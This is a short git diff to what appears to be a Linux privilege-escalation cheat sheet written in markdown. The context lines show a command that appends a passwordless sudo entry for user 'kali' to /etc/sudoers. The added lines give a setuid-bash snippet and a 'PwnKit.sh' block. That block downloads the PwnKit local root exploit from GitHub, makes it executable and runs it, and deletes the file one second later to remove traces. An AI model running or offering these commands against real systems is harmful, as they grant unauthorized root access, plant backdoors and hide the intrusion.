@@ -1345,6 +1345,11 @@ sudo -l
 echo 'kali ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
 ~~~~
 
+#### SetUID to /bin/bash
+
+~~~ bash
+echo "chmod u+s /bin/bash"
+~~~
 
 
 ### Inspecting Service Footprints
@@ -1470,3 +1475,15 @@ x86_64
 ~~~ bash
 searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
 ~~~
+
+
+#### PwnKit.sh
+
+~~~ bash
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
+chmod +x ./PwnKit || exit
+(sleep 1 && rm ./PwnKit & )
+./PwnKit
+~~~
+
+
